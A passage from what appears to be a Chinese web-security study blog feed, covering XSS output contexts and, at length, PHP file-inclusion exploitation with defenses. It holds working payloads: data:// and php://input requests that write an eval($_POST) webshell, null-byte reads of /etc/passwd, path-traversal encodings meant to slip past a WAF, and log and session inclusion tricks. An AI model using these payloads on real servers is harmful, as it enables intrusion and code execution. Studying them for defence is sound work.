<h3 id="具体实例">具体实例</h3>
<h4 id="在HTML标签中输出">在HTML标签中输出</h4>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>$var<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span>&gt;</span>$var<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这种情况一般是构造一个<code>&lt;script&gt;</code>标签，payload：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(xss)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>防御方式是对变量使用HtmlEncode。</strong></p>
<h4 id="在HTML属性中输出">在HTML属性中输出</h4>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;abc&quot;</span> <span class="attr">name</span>=<span class="string">&quot;$var&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;abc&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>防御方式也是采用HtmlEncode。</strong></p>
<h4 id="在-script-标签中输出">在&lt;script&gt;标签中输出</h4>
<p>在&lt;script&gt;标签中输出，首先应该确保输出的变量在引号中：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> x = <span class="string">&quot;$var&quot;</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>攻击者首先要先闭合引号才能实施XSS攻击：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> x = <span class="string">&quot;&quot;</span>;alert(<span class="regexp">/xss/</span>);<span class="comment">//&quot;;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>防御时使用JavaScriptEncode。</strong></p>
<h4 id="在事件中输出">在事件中输出</h4>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">&quot;funcA(&#x27;$var&#x27;)&quot;</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>payload：<code>var = '); alert(/xss/);//</code></p>
<p>即：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">&quot;funcA(&#x27;&#x27;); alert(/xss/);//&#x27;)&quot;</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>防御时使用JavaScriptEncode编码。</strong></p>
<h4 id="在CSS中输出">在CSS中输出</h4>
<p>一般来说，尽可能禁止用户可控制的变量在”&lt;style&gt;标签“、”HTML标签的style属性“以及”CSS文件“中输出。</p>
<h4 id="在地址中输出">在地址中输出</h4>
<p>一个URL组成如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Protocal][Host][Path][Search][Hash]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.evil.com&#x2F;a&#x2F;b&#x2F;c&#x2F;?abc&#x3D;123#ssss</span><br><span class="line">[Protocal] &#x3D; &quot;https:&#x2F;&#x2F;&quot;</span><br><span class="line">[Host] &#x3D; &quot;www.evil.com&quot;</span><br><span class="line">[Path] &#x3D; &quot;&#x2F;a&#x2F;b&#x2F;c&#x2F;&quot;</span><br><span class="line">[Search] &#x3D; &quot;?abc&#x3D;123&quot;</span><br><span class="line">[Hash] &#x3D; &quot;#ssss&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>一般来说，在URL的path（路径）或者search（参数）中输出，使用URLEncode即可。URLEncode会将字符转换为”%HH“形式。</p>
<p>但在Protocal和Host中不能使用严格的URLEncode编码，因为会把<code>://</code>、<code>.</code>等都编码掉。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;$var&quot;</span> &gt;</span>Test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>攻击者可以使用伪协议实施攻击：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1);&quot;</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>对于Mozilla支持的<code>dataURI</code>伪协议，它能够将一段代码写在URI中，例如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;dataURI:test/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这段代买的意思时，以test/html的格式加载编码为base64的数据。加载完成后实际上时：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>对于这种手段的攻击，首先应该检查变量是否是以<code>http</code>开头，如果不是则自动加上，再对变量进行URLEncode，即可保证没有此类的XSS攻击。</p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>web安全基础</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全学习之文件包含漏洞利用</title>
    <url>/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="Web安全学习之文件包含漏洞利用">Web安全学习之文件包含漏洞利用</h1>
<p>这一篇主要来聊一聊PHP的文件包含漏洞，主要包括<strong>本地文件包含（Local File Inclusion，LFI）</strong>、<strong>远程文件包含（Remote File Inclusion， RFI）<strong>和</strong>PHP伪协议的利用</strong>。</p>
<h2 id="文件包含的基本概念">文件包含的基本概念</h2>
<p>严格来说，文件包含漏洞是代码注入的一种，其原理就是注入一段用户能控制的脚本或代码，使服务器端执行。至于文件包含，也就是一种“外部数据流包含”，这个外部数据流可以是文件，也可以是POST数据流的形式。</p>
<p>对于PHP具体而言，有４个可利用的函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span>()</span><br><span class="line"><span class="keyword">require_once</span>()</span><br><span class="line"><span class="keyword">include</span>()</span><br><span class="line"><span class="keyword">include_once</span>()</span><br></pre></td></tr></table></figure>
<p>当使用这4个函数包含一个新文件时该文件将作为PHP代码执行，PHP内核并不会判断该被包含的文件是什么类型。也就是说，如果被包含的txt文件、图片文件、远程URL都会作为PHP代码被执行。</p>
<p>举一个最简单的例子来看看：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>($_GET[test]);    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>fortest.txt文件内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for test</span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>页面结果：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191114140517.png" alt=""></p>
<p>要想成功利用文件包含漏洞，需要满足下面两个条件：</p>
<ol>
<li>include()等函数通过动态变量的方式引入需要包含的文件；</li>
<li>用户能控制该动态变量。</li>
</ol>
<h2 id="远程文件包含">远程文件包含</h2>
<p>如果PHP的配置选项allow_url_include为ON的话，则include/require函数是可以加载远程文件的，这种漏洞称为远程文件包含漏洞，比如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $basePath = $_GET[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">	<span class="keyword">require_once</span> $basePath . <span class="string">&quot;/action/m_share.php&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>上面的代码看似将路径的后半段已经规定了，但利用HTTP参数还是有办法绕过：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;FileInclude&#x2F;index.php?path&#x3D;http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;solution.php?</span><br></pre></td></tr></table></figure>
<p>所以实际的执行代码就是：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;http://localhost/FileInclude/index.php?path=http://localhost/test/solution.php?/action/m_share.php&quot;</span></span><br></pre></td></tr></table></figure>
<p>即，问号&quot;?&quot;后面的代码被解释成URL的querystring，这也是一种&quot;截断&quot;思想，和%00一样。</p>
<p>防御方法：关闭远程文件包含的配置错误，即<code>allow_url_include = Off</code></p>
<h2 id="本地文件包含">本地文件包含</h2>
<p>能过打开并包含本地文件的漏洞，被称为本地文件包含漏洞。</p>
<p>看到这里，利用远程文件包含我们可以执行攻击者的任意代码，而本地文件包含漏洞只能查看或运行本地文件。但是，其实我们可以使用PHP的伪协议等方式来利用本地文件包含漏洞，接下来讲的是如下几种利用方式：</p>
<ul>
<li>PHP伪协议（较为通用）</li>
<li>包含Session文件</li>
<li>包含日志（较为通用）</li>
<li>包含environ文件</li>
<li>包含临时文件</li>
<li>包含上传文件</li>
</ul>
<h3 id="PHP伪协议">PHP伪协议</h3>
<h4 id="php-协议">php://协议</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:&#x2F;&#x2F;input</span><br><span class="line">php:&#x2F;&#x2F;filter</span><br></pre></td></tr></table></figure>
<p>php://input用于执行PHP代码，php://filter用于读取源码。</p>
<h5 id="php-filter">php://filter</h5>
<p>php://filter是一种元封装器，设计用于&quot;数据流打开&quot;时的&quot;筛选过滤&quot;应用，对本地磁盘文件进行读写。简单来讲就是可以在执行代码前将代码换个方式读取出来，只是读取，不需要开启allow_url_include。</p>
<p><strong>用法：<code>?file=php://filter/convert.base64-encode/resource=xxx.php</code></strong></p>
<p>假设页面的源代码<code>index.php</code>为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;asdf&lt;/title&gt;</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span>(!$_GET[file])&#123;<span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&#x27;</span>;&#125;</span><br><span class="line">	$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(strstr($file,<span class="string">&quot;../&quot;</span>)||stristr($file, <span class="string">&quot;tp&quot;</span>)||stristr($file,<span class="string">&quot;input&quot;</span>)||stristr($file,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">include</span>($file); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url: http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br><span class="line">result: PD9waHAgc3lzdGVtKCdpcGNvbmZpZycpOz8+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>base64解密就可以看到内容，这里如果不进行base64_encode，则被include进来的代码就会被执行，导致看不到源代码。</p>
</blockquote>
<h5 id="php-input">php://input</h5>
<p>php://input协议主要用于访问各个输入/输出流。CTF中经常使用<code>file_get_contents</code>获取php://input内容(POST)，需要开启allow_url_include，并且当<code>enctype=&quot;multipart/form-data&quot;</code>的时候 php://input是无效的。</p>
<p><strong>利用方式：<code>?file=php://input 数据利用POST传过去</code></strong></p>
<blockquote>
<p>碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据。</p>
</blockquote>
<p>假设页面源代码为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (@file_get_content($file) == <span class="string">&#x27;meizijiu&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>直接使用Hackbar工具POST数据：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191114222620.png" alt=""></p>
<p>另外还可以写入一句话：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.inc.com&#x2F;inc.php?file&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line">post数据:</span><br><span class="line">&lt;?php </span><br><span class="line">echo file_put_contents(&quot;test.php&quot;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NjJ10pPz4&#x3D;&quot;));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="data-协议">data://协议</h4>
<blockquote>
<p>php.ini：allow_url_include=On、allow_url_fopen()都为On</p>
</blockquote>
<p>利用data://伪协议进行代码执行的思路原理和php://是类似的，都是利用了PHP中的流的概念，将原本的include的文件流重定向到了用户可控制的输入流中。</p>
<p>页面示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;for test&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.inc.com&#x2F;inc.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">http:&#x2F;&#x2F;www.inc.com&#x2F;inc.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br><span class="line">http:&#x2F;&#x2F;www.inc.com&#x2F;inc.php?file&#x3D;data:text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">http:&#x2F;&#x2F;www.inc.com&#x2F;inc.php?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br><span class="line">http:&#x2F;&#x2F;www.inc.com&#x2F;inc.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgZWNobyBmaWxlX3B1dF9jb250ZW50cygidGVzdC5waHAiLGJhc2U2NF9kZWNvZGUoIlBEOXdhSEFnWlhaaGJDZ2tYMUJQVTFSYkoyTmpKMTBwUHo0PSIpKTs&#x2F;Pg&#x3D;&#x3D;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最后一个URL使用<code>file_put_contents()</code>函数将<code>&lt;?php eval($_POST['cc'])?&gt;</code>写到了<code>test.php</code>文件当中，如图：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191115093051.png" alt=""></p>
<h4 id="phar-协议">phar://协议</h4>
<blockquote>
<p>php版本 ≥ 5.3</p>
</blockquote>
<p>phar://：PHP 归档，常常跟文件包含，文件上传结合着考察。当文件上传仅仅校验mime类型与文件后缀，可以通过以下方式进行利用。</p>
<p><strong>利用方式：写入一句话shell.php -&gt; 压缩为shell.zip -&gt; 修改后缀为shell.jpg -&gt;上传到网站 -&gt; phar://shell.jpg/shell.php</strong></p>
<p>假设有个文件phpinfo.txt，其内容为<code>&lt;?php phpinfo(); ?&gt;</code>，打包成zip压缩包，如下：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191115173036.png" alt=""></p>
<p>指定绝对路径：</p>
<p><code>index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191115173136.png" alt=""></p>
<h4 id="zip-协议">zip://协议</h4>
<blockquote>
<p>php版本 ≥ 5.3</p>
</blockquote>
<p>利用和构造zip包的方法同phar://协议，但使用zip协议，需要指定绝对路径，同时将<code>#</code>编码为<code>%23</code>，之后填上压缩包内的文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?file&#x3D;zip:&#x2F;&#x2F;D:\phpStudy\WWW\fileinclude\test.zip%23phpinfo.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="包含Session文件">包含Session文件</h3>
<p>前提条件：Session文件路径已知，且其中内容的部分可控。</p>
<p>首先第一个条件：Session的文件路径可以在php.ini中的<code>session.save_handler</code>字段查看到：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191115195053.png" alt=""></p>
<blockquote>
<p>一般而言，session文件的存放位置为：</p>
<ul>
<li>/var/lib/php/sess_PHPSESSID</li>
<li>/tmp/sess_PHPSESSID</li>
<li>/tmp/sessions/sess_PHPSESSID</li>
</ul>
</blockquote>
<p>第二个条件：内容可控，这个要求较为苛刻，有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码。</p>
<h3 id="包含日志文件">包含日志文件</h3>
<p>前提条件：要知道服务器日志的存储路径，且日志文件可读。</p>
<p>服务器一般回在Web Server的access_log里记录客户端的请求信息，在error_log里记录出错信息。所以攻击者可以间接地将PHP代码写入日志文件，在文件包含时，只需要包含日志文件即可。</p>
<p>但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用burp截包后修改。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191115195755.png" alt=""></p>
<p>正常的PHP代码已经写入了 /var/log/apache2/access.log。然后进行包含即可。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191115195833.png" alt=""></p>
<h3 id="包含environ文件">包含environ文件</h3>
<p>/proc/self/environ文件里面有Web进程运行时的环境变量，其中很多都是用户可以控制的，最常见的做法就是在User-Agent中注入PHP代码。</p>
<p>这里有很完整的利用过程说明： <a href="https://www.exploit-db.com/papers/12886">https://www.exploit-db.com/papers/12886</a></p>
<h3 id="包含临时文件">包含临时文件</h3>
<p>以上这些方法都要求PHP能过包含这些不处于Web目录下的文件，如果PHP设置了open_basedir，则很可能会使得攻击失效。</p>
<p>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p>
<p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。</p>
<p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。这个方法可以参考[LFI With PHPInfo Assistance](<a href="https://www.insomniasec.com/downloads/publications/LFI">https://www.insomniasec.com/downloads/publications/LFI</a> With PHPInfo Assistance.pdf)</p>
<h3 id="包含上传文件">包含上传文件</h3>
<p>就给一道CTF的题吧，最近在玩这个，膜拜一下大佬写的脚本。</p>
<p><a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/">XMAN夏令营-2017-babyweb-writeup</a></p>
<h2 id="绕过方式">绕过方式</h2>
<p>比如下面这段代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (file_exists(<span class="string">&#x27;/home/wwwrun/&#x27;</span>.$file.<span class="string">&#x27;.php&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;/home/wwwrun/&#x27;</span>.$file.<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这段代码把inlcude路径的前缀部分、后缀部分都给控制住了。相比于连路径的前缀都由用户控制的那种漏洞已经安全多了。但是这里存在几个问题。</p>
<h3 id="00字符截断">00字符截断</h3>
<blockquote>
<p>这种方式需要 PHP版本&lt;=5.2</p>
</blockquote>
<p>用户能够控制file参数，当file的值为<code>../../etc/passwd\0</code>时，相当于执行了<code>include '/home/wwwrun/../../etc/passwd'</code>这条语句。</p>
<blockquote>
<p>如果不适用<code>\0</code>截断的话，被包含的文件实际上是<code>/etc/passwd.php</code>，但这个文件自然是不存在的。所以在这个地方，攻击者只要在最后加入一个0字节（\x00），就能截断file变量之后的字符串。</p>
</blockquote>
<p>如果是通过Web输入，只需要UrlEencode变为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>防御方式：过滤\00截断字符，过滤代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getVal</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $value = <span class="keyword">isset</span>($_GET[$name]) ? $_GET[$name] : <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (is_string($value))</span><br><span class="line">    &#123;</span><br><span class="line">        $value = str_replace(<span class="string">&quot;\0&quot;</span>, <span class="string">&#x27;&#x27;</span>, $value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="超长字符截断">超长字符截断</h3>
<p>目录字符串在Windows下256字节、Linux下4096字节时，会达到最大值，最大值之后的字符被丢弃。<strong>可以通过<code>./</code>的方式构造目录</strong>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;abc</span><br><span class="line">&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;abc</span><br><span class="line">..&#x2F;1&#x2F;abc..&#x2F;1&#x2F;abc..&#x2F;1&#x2F;abc</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="目录遍历">目录遍历</h3>
<p>除了这种攻击方式，还可以使用&quot;…/…/…/“这样的方式来返回到上层目录中，这种方式又被称为&quot;目录遍历(Path Traversal)”。常见的目录遍历漏洞，还可以通过不同的编码方式来绕过一些服务器端的防御逻辑(WAF) ：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%2e%2e%2f    -&gt;    ..&#x2F;</span><br><span class="line">%2e%2e&#x2F;     -&gt;    ..&#x2F;</span><br><span class="line">..%2f     -&gt;    ..&#x2F;</span><br><span class="line">%2e%2e%5c    -&gt;    ..\</span><br><span class="line">%2e%2e%\    -&gt;    ..\</span><br><span class="line">..%5c     -&gt;    ..\</span><br><span class="line">%252e%252e%255c    -&gt;    ..\</span><br><span class="line">..%255c     -&gt;    ..\</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>防御方式</p>
<p>目录遍历漏洞是一种跨越目录读取文件的方法，但当PHP配置了open_basedir时，将很好地保护服务器，使得这种攻击无效。<br>
open_basedir的作用是限制在某个特定目录下PHP能打开的文件。</p>
<blockquote>
<p>需要注意的是，open_basedir的值是目录的前缀，如果设置如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">open_basedir &#x3D; &#x2F;home&#x2F;aaa</span><br></pre></td></tr></table></figure>
<p>那么以下的目录都是被允许的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;home&#x2F;aaa</span><br><span class="line">&#x2F;home&#x2F;aaa&#x2F;bbb</span><br><span class="line">&#x2F;home&#x2F;aaa&#x2F;ccc</span><br></pre></td></tr></table></figure>
<p>如果要限定一个指定的目录，则需要在后面加上一个<code>/</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;open_basedir &#x3D; &#x2F;home&#x2F;aaa&#x2F;</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="URL绕过">URL绕过</h3>
<h4 id="query（-）">query（?）</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?file&#x3D;http:&#x2F;&#x2F;remoteaddr&#x2F;remoteinfo.txt? </span><br></pre></td></tr></table></figure>
<p>则包含的文件为 <code>http://remoteaddr/remoteinfo.txt?/test/test.php </code>。</p>
<p>问号后面的部分<code>/test/test.php</code>，也就是指定的后缀被当作query从而被绕过。</p>
<h4 id="fragment">fragment(#)</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?file&#x3D;http:&#x2F;&#x2F;remoteaddr&#x2F;remoteinfo.txt%23</span><br></pre></td></tr></table></figure>
<p>则包含的文件为<code>http://remoteaddr/remoteinfo.txt#/test/test.php </code>。</p>
<p>问号后面的部分<code>/test/test.php</code>，也就是指定的后缀被当作fragment从而被绕过。注意需要把<code>#</code>进行url编码为<code>%23</code>。</p>
<h2 id="防御方式">防御方式</h2>
<p>综上，要防御LFI的漏洞，应该尽量避免包含动态的变量，尤其是用户可以控制的变量。一种变通的方式，则是使用枚举：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//whitelisting possible values</span></span><br><span class="line">    <span class="keyword">switch</span>($file)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;main&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;foo&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;bar&quot;</span>:</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&quot;/home/wwwrun/include&quot;</span> . $file . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&quot;/home/wwwrun/include/main.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="Reference">Reference</h2>
<ul>
<li>《白帽子讲Web安全》</li>
